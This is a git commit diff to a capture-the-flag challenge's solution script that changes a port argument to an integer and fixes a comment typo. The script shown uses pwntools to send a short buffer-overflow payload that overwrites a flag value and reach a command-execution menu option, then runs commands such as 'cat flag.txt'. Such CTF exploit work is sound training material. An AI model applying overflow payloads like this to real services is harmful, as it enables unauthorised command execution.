aafb613fefa1977bff9547e94a2d55ea31e72d50
Enigmatrix <enigmatrix2000@gmail.com>
2021-11-02 15:10:32 +0800

    add docker-compose.yml, convert port to int for checker soln

--- pwn/checker/solution/solve.py
+++ pwn/checker/solution/solve.py
@@ -3,7 +3,7 @@ from pwn import *
 # To run locally, run as `python3 solve.py`
 
 if args.REMOTE:
-    conn = remote(args.HOST, args.PORT)
+    conn = remote(args.HOST, int(args.PORT))
 else:
     conn = process("./checker.o")
 
@@ -13,7 +13,7 @@ payload = b"A"*0x20
 payload += b"\x01\x00\x00\x00"
 
 conn.sendlineafter("Enter your name:", payload)
-conn.sendlineafter("> ", "3") # optiont to execute command
+conn.sendlineafter("> ", "3") # option to execute command
 
 # at this point, typing any command e.g. cat flag.txt
 # and pressing enter will run the command in the host
